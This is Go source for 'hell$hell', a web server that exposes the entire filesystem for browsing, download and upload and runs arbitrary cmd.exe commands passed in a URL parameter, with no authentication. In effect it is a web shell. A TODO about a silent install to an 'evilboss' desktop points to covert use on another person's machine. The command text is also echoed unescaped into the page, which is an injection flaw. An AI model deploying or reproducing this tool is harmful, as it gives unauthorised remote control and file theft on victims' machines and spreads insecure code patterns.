//The hell$hell is lightweight web file server for remote admins
//Browsing and transfering files, execute remote command
//By default do serving at http://127.0.0.1:1666/

package main

import (
	//"fmt"
	"html"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"encoding/base64"
)
//TODO windows cmd script for silent install to evilboss desktop
//TODO Git revision tag v2
const Revision = "$Id$"
var (
	stdout           []byte   //Output of command
	dirs, navi, href []string // Catalogs of Path
	err              error    //Error
)
//myContract (HTTP response)
func myContract(serv http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if 0 < strings.Index(r.URL.Path, "favicon.ico") {
			icon, _ := base64.StdEncoding.DecodeString(favicon) 
			io.WriteString(w, string(icon))
			return
		}
		cmdstr := r.FormValue("cmd")
		filename := r.URL.Path
		if '/' != filename[len(filename)-1] && len(cmdstr) == 0 {
			file, _ := os.Open(filename)
			defer file.Close()
			io.Copy(w, file) //Download file
			return
		}
		//Navigation ------------------------
		dirs = strings.Split(r.URL.Path, "/")
		href := []string{}
		navi := append(navi, "<hr/><a href=\"/\">ROOT")
		for _, dir := range dirs[1 : len(dirs)-1] {
			navi = append(navi, "</a>/<a href=\"/")
			href = append(href, dir)
			href = append(href, "/")
			navi = append(navi, strings.Join(href, ""))
			navi = append(navi, "\">")
			navi = append(navi, dir)
		}
		navi = append(navi, "</a><br/><hr/>\n")
		//Navigation ---------------------

		io.WriteString(w, htmlhead) //Before
		io.WriteString(w, strings.Join(navi, ""))

		if r.Method == "POST" { //Upload file
			r.ParseMultipartForm(32 << 20)
			if upfile, handler, err := r.FormFile("uploadfile"); err == nil {
				defer upfile.Close()
				if saveto, err := os.OpenFile(r.URL.Path+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666); err == nil {
					defer saveto.Close()
					io.Copy(saveto, upfile)
				} //else
//TODO Error message panel to webmuzzle
			} 
		}

		htmlCmdForm := strings.Replace(htmlform, "$CMD$", cmdstr, 1)
		io.WriteString(w, htmlCmdForm) //Web muzzle

		if 0 < len(cmdstr) {
//TODO Set Timeout for exec or Kill button
/*TODO Set Environment from webform before execute 
			cmd.Env = append(os.Environ(),
			    "FOO=duplicate_value",
			    "FOO=actual_value",
			)
*/
			os.Chdir(r.URL.Path)
			
//1 TODO Escaped cmd.exe args: Space Into Filename Trouble
//2 TODO Get cmd from webform
			stdout, err = exec.Command("cmd", "/C", cmdstr).Output()
			if err != nil {
				io.WriteString(w, "Error: " + err.Error())
			}
			io.WriteString(w, "<pre class=\"term\">")
			io.WriteString(w, html.EscapeString(string(stdout)))
			io.WriteString(w, "</pre><hr/>")
		}

		serv.ServeHTTP(w, r) //Call origin

		io.WriteString(w, strings.Join(navi, ""))
		io.WriteString(w, htmltail) //HTML Tail
	})
}

//hell$hell init
func init() {
	http.Handle("/", myContract(http.FileServer(http.Dir("/"))))

//2 TODO ip:port webform save to config 
	http.ListenAndServe("127.0.0.1:1666", nil)
//3 TODO read config or create new
}

//hell$hell run
func main() {}

//Web muzzle

//TODO HTML stylesheet
//TODO HTML CSS List of Style into webmuzzle & save to .ini
//TODO Auto meta codepage
var htmlhead string = `
<!DOCTYPE html>
<html>
<head><title>hell</title>
<meta codepage="$CODEPAGE$"/>
<meta =stylesheet content />
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 5%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
.promo {
	vertical-align: bottom;
	weight: 100%;
	font-family: Courier New;
	font-size: 9pt;
}
</style>
</head>
<body>
	<form enctype="multipart/form-data" action="" method="post">
 		<input type="file" name="uploadfile" />
 	   <input type="hidden" name="token" value="{{.}}"/>
 	  	 <input type="submit" value="upload" />
	</form>
`

//2 TODO os.CMD to webform
//2 TODO list  raw - cmd - wbscript - bash - csh - tcsh by os.Type
//TODO os.Environ webform
//TODO Listen address:port webform
var htmlform string = `
<div class="cmd">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="$CMD$"/>
	   <input type="submit" value="Enter" /><br/>
<!--input class="env" type="textbox" name="env" value=""/-->
	</form>
</div>
`

//TODO table weight=100%
var htmltail string = `
<table class="promo">
<tr weight="100%">
<th><a target=_blank href="https://goo.gl/gVxGpd">License</a></th>
<th><a target=_blank href="https://github.com/andreingor/hellShell/">Source</a></th>
<td>Revision $Id$</td>
<th>&copy;2017-2018&nbsp;<a target=_blank href="https://goo.gl/CqgrAF">Max&nbsp;Lance(R)</a></th>
</tr>
</table>
</body>
</html>
`
var favicon string = `
AAABAAEAQkIQAAEABADIDAAAFgAAACgAAABCAAAAhAAAAAEABAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAHBxcAExQJAAcHPAALB3gABwSdAC8wIQALAP8AEgvaAA4L9wBMTToAbG1YAI+QfwC7vbIA
3N/bAPr++wAAAAAAiIiHeIaIiIiGh3iGaIiIaIiHeId4iIaHeGd3iIiHdoaGAAAAiIiIiIiIh4aI
iIiIaHiGh4ZodoiIaHiIeIiIeIiHiGiIAAAAiIiIiIiIZ4iIiIiIiIiIiIiGiGiIh3iIZmiIh4iG
iHiIAAAAhoiIiIiIiIiIiIiIiIiIh4iIiIZmiIhmiIhoh2hmaHiGAAAAZoiIiIiIiIiIaIiIaIiG
iIiIiId2aIZ0MzMzeGhoiIiIAAAAhoiIiIiIiIiIiIiIiIiIiIiIiHiIhmcwAAASSIaIeIiIAAAA
aIeIiIiIiIiIiIiIaIiGiIhnd4aIhmchWqlQN4ZneIh3AAAAhoiIiIiIhoiIiIiIiIiIiIiIiIiI
hoQhvdygN2aIiIiIAAAAiIiIiIiIiIiGiIiGiIiGiIiIZoZmZoclzu6wN2aIZoaIAAAAiGiIiIiI
iIiIiIiIiGiIiIiGiGZmZoQlvu6iSIZohmiIAAAAh3iIiIiIiIiIiIiGaIiIiIiGhoZ3REIQvu2g
J2aGiId3AAAAiIiIiIiGhoiIiIiIiIiIiIhoiHQyIiAFzu2gAjSIaHiIAAAAhoiIiIhoiIiGiIho
iIiIiIiHdCIFWZqr3u7JEQI3aIhoAAAAhoiIiIiIiIiIiIiIiIiIiIiHIRWbvM3u7u7cupUSR4aG
AAAAiIiIhmiIiIiIiIhoiIiIiIhkAZzd7u7u7u7u3ctRI3aIAAAAiIaIiIiGaIiIhoiIiIiIiIiD
Bc7u7u7u7u7u7u7KEEZoAAAAiGiIhoaIiIiGiIhoiIiIaIaENb7u7u7u3d7u7u7tpSR4AAAAaIdo
iIiIiIiIiIiIiIhoiIiHQK3u7dy7u7ze7u7u2gJ3AAAAhoiIiIiIiIiIiIhoiIiIiIiIQJztu5mV
VVmc3u7u7JA4AAAAiIhoiIiIiIiIhoiIiIiIiIiIcpq6UAIiIiIFve7u7qEnAAAAiIiIiIiIiIiI
iIiIiIiIiGiIchFSIjRHd3QgW+7u7sUkAAAAh3aIiIiIiIiIaIiIiIhoiIiIcyEjR3iIiIhyCt7u
7spTAAAAiIiIiIiIiIiIiIiGiGiIhoaIh0RHhmaIhmaDKc7u7tpTAAAAiIiIhoiIiIiIaIiIiIiI
iIiIZoeGZmiHiGZzCd7u7tpTAAAAhoiIiIiIiIiIiIiGiIiIiIiIhoZmiIZmZmcwC+7u7tpTAAAA
iIiIiGhoaIhoiIiIiIhoiGiId2iIZmiIh0MAne7u7sojAAAAhoiIiIiIiIaIaIiIiIiIiIiIeGhm
aId3MyBazu7u7smUAAAAaIiIiIiIiIiIiIiIiIiIiIiIiIaIhnQwAVm97u7u7qUkAAAAh4iIiIiI
iIiIiIiIaIaIiIiIaIiIdCAVmrzu7u7u7KA3AAAAh4iIiIiIiIiIiIiIiIiIiIiIhmZ0IhWrze7u
7u7u2pJ4AAAAiGiIiIiIiIiIiIiIaIiIiIhoZmcwFaze7u7u7u7sqZOGAAAAhoiIiIiIiIiIiIiI
iIiIiGiGZnMBm97u7u7u7u7KUjiGAAAAZoiIiIiGiIiIiIiIiIhoiIiGZzBa3u7u7u7u7cuVA4aI
AAAAiIiIiGiIiGiIaIiIiIiIiIhocwW97u7u7u7cypUDSIaIAAAAiIiGiIiIiIhoiIhohoiIiIho
clre7u7u7ty5UQJHhmh3AAAAiIiIhoaGhoiIiIiIiIiIhoiHMJzu7u7u3KkQAkeGaIiIAAAAh4iI
iIiIiIaGhoaIiGiIiIiHMK3u7u7cpRIjR4ZmiGZoAAAAiGiIiIiIiIiIiIiGiIiIiGhnJb7u7u3J
EDNHhmaIaIeGAAAAhoiIiIiIiIiIiIiIiGiIiIhkJc7u7uyRBHiGhohmaIeGAAAAiIiIiIiIiIiI
iIiIiIiGiIiEJc7u7usCSIZmZmZoiIeIAAAAeIiIiIiIiIiIiIiIiIiIiGiHJc7u7usCdmZmiId0
RIZmAAAAeIiIiIiIiIiIiIiIiIiIiIiHIb7u7usASIeHeHQyAniIAAAAeIiIiIiIiIiIiIiIiIiI
iIiHMK3u7u2QAjRDMyIBEEZmAAAAhoiIiGiGiGiGiIiIiIiIiIiIQJzu7u7KUQAAAVmqUThoAAAA
ZoiGiIiIiIiIiIhoiGiIiIhmchrO7u7tuqmZqrzdtTiIAAAAiIiIiGiGiGiGiGiIhoiIiIiGhCmt
7u7u7dzd3d7uySRmAAAAh4iIaIaIaIaIaIaIaIhoaIhohjBaze7u7u7u7u7u2QN2AAAAh4iIiIiI
iIiIiIiIiIaIiIiIZnMlq97u7u7u7u7uyhJ4AAAAiIiIiIiIiIiIiIiIiIiIiIaGZmdCVZvN7u7u
3t3MqRN4AAAAhoiIiIiIiIiIiIiIiIiIiIiIh3ZnMBVaze7buqupVSSIAAAAiIiIiIiIiIiIiIiI
iIiIiIiId4ZodDIAre7JERECI3iIAAAAiIiIiIiIiIiIiIiIiIiIiIiId4hmZoQAre6wEjM0eIaH
AAAAh4iIiIiIiIiIiIiIiIiIiIaIiGaIZocwru61JId4ZmaIAAAAiIiIhoiIiIiIiIiIhoiIiIiI
ZoiIiGc1re61N4ZmaIiGAAAAiIiGiGiIaIaGiIaIhohoiIiIZoiIhmcwrMyhJ2ZmiIiIAAAAaIiI
iIiGiIaIiGiIaIhohoiIh2ZneIcwVZlQN4iIiIiIAAAAiIiIiIiIiIiIiIiIiIiIiGiIeGZnhmhC
AAACN2eIiIaIAAAAaIiIiIiIiIiIiIiIiIiIiIiIeIh4hoh0REREeIeIiIiHAAAAiIiIiIiIiIiI
iIiIiIiIiIiGiIiId4aIiHeGaIhoaIiGAAAAaIiIiIiIiIiIiIiIiIiIiIhmaGhoiIiGaIiIhoaI
hoiIAAAAiIiIiIiIiIiIiIiIiIiIiIiGh4hniIeGh4aIeGh4iHiIAAAAaIeIiIiIiIiIiIiIiIiI
iIiId4Z3hod2h3aHeId4Z3iGAAAAiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiGAAAA
iIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAZmZmZmZmZmZmZmZmZmZmZmZmZmZm
ZmZmZmZmZmZmZmZmAAAAiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
`
//EOF
